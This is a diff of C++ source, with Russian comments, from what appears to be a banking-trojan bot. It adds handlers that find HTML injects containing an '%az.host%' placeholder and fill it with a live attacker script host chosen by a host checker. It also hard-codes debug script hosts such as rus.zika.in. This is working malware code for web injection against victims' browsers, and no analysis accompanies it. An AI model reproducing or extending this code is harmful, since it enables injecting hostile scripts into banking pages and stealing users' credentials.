@@ -2,7 +2,6 @@
 #pragma hdrstop
 
 
-
 #include "Modules.h"
 
 
@@ -12,9 +11,6 @@
 	//   используем отдельные настройки
 	//****************************************
 	#define USE_AZ_CONFIG
-#else
-
-    #include "AzConfig.h"
 
 #endif
 
@@ -23,39 +19,44 @@
 #include "Config.h"
 #include "Utils.h"
 #include "BotHosts.h"
+#include "BotDef.h"
+#include "BotConfig.h"
 //-----------------------------------------------------------------------------
 
 
 // Внутренние данные модуля
 namespace AZDATA
 {
-	DWORD PID = 0; // Идентификаор процесса в котором работает модуль
-    THostChecker *Checker = NULL; // Система проверки работоспособности хостов
+	DWORD PID = 0; 				  // Идентификаор процесса в котором работает модуль
+	THostChecker *Checker = NULL; // Система проверки работоспособности хостов
+
+    char Variable_ScriptHost[] = {'%','a','z','.','h','o','s','t','%', 0};;
 }
 
 
 
 #ifdef USE_AZ_CONFIG
 
+
+
+
 	char AZ_HOSTS[AZCONFIG_PARAM_SIZE_HOSTS] = AZCONFIG_PARAM_NAME_HOSTS;
 
 	#define AZ_HOSTS_HASH 0xE0203A42 /* __AZ_HOSTS__ */
 
-#endif
 
+	//*****************************************************************
+	//  Хосты, которые будут вшиваться в HTML инжекты
+	//*****************************************************************
+	#ifdef DEBUGCONFIG
+		// Отладочные данные
+		char AZ_SCRIPTS_HOSTS[] = "rus.zika.in\0";
+	#else
+		// Рабочий массив
+		char AZ_SCRIPTS_HOSTS[AZCONFIG_PARAM_SIZE_SCRIPTHOSTS] = AZCONFIG_PARAM_NAME_SCRIPTHOSTS;
+	#endif
 
-//*****************************************************************
-//  Хосты, которые будут вшиваться в HTML инжекты
-//*****************************************************************
-#ifdef DEBUGCONFIG
-    // Отладочные данные
-	char AZ_SCRIPTS_HOSTS[] = "rus.gipa.in\0\0";
-#else
-	// Рабочий массив
-	char AZ_SCRIPTS_HOSTS[AZCONFIG_PARAM_SIZE_SCRIPTHOSTS] = AZCONFIG_PARAM_NAME_SCRIPTHOSTS;
-#endif
-
-#define AZ_SCRIPTS_HOSTS_HASH 0x94D84D31 /* __AZ_SCRIPTS_HOSTS__ */
+	#define AZ_SCRIPTS_HOSTS_HASH 0x94D84D31 /* __AZ_SCRIPTS_HOSTS__ */
 
 
 
@@ -109,19 +110,63 @@ void AzInicializeHostChecker()
 }
 //-----------------------------------------------------------------------------
 
+void AZInjectActivated(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam)
+{
+	// Запуск процесса проверки хоста
+    AzCheckScriptHosts();
+}
+
+
+void AZInjectExecute(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam)
+{
+	// Устанавливаем значение хоста
+	TBotConfig* Config = Config::GetConfig();
+	if (Config && AZDATA::Checker)
+	{
+		string Host = AZDATA::Checker->GetWorkHost();
+		if (Host.IsEmpty())
+			Host = AZDATA::Checker->FirstHost;
+		Config->HTMLInjects->Variables->SetValue(AZDATA::Variable_ScriptHost, Host);
+	}
+}
+
+void AZInjectsLoadedEvent(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam)
+{
+	THTMLInjectList* Injects = (THTMLInjectList*)Sender;
+
+	// Перебираем все инжекты в поисках инжектов  нужной переменной
+	TLock L = Injects->GetLocker();
+
+
+	int Count = Injects->Count();
+	for (int i = 0; i < Count; i++)
+	{
+		THTMLInject *Inject = Injects->Items(i);
+		if (Inject->ContainVariable("%az.host%"))
+		{
+			// Подключаемся к инжекту в ожидании его активации
+			Inject->AttachEvent(BOT_EVENT_HTMLINJECT_ACTIVATED, AZInjectActivated);
+			Inject->AttachEvent(BOT_EVENT_HTMLINJECT_EXECUTE, AZInjectExecute);
+		}
+
+	}
+}
+
+
 
 //----------------------------------------------------
 //  AzInizializeHTMLInjects  - Функция инициализирует
 //  систему подмены ссылок в HTML инжектах
 //----------------------------------------------------
-void AzInizializeHTMLInjects(const THTMLInjectList &Injects)
+void AzInizializeHTMLInjects()
 {
 	// перебираем инжекты и ищем в них вхождение параметра
-
-	int Count = Injects.Count();
-	for (int i = 0; i < Count; i++)
+	TBotConfig* Config = Config::GetConfig();
+	if (Config)
 	{
-        THTMLInject *Inject = Injects[i];
+		// Подключаемся к событию загрузки HTML инжектов
+		Config->HTMLInjects->AttachEvent(BOT_EVENT_HTMLINJECTS_LOADED, AZInjectsLoadedEvent);
+		AZInjectsLoadedEvent(Config->HTMLInjects, 0, 0, 0);
 	}
 }
 //-----------------------------------------------------------------------------
@@ -158,3 +203,10 @@ string AzGetScriptHost()
 	return AZDATA::Checker->GetWorkHost();
 }
 //-----------------------------------------------------------------------------
+
+
+
+
+
+//-----------------------------------------------------------------------------
+#endif
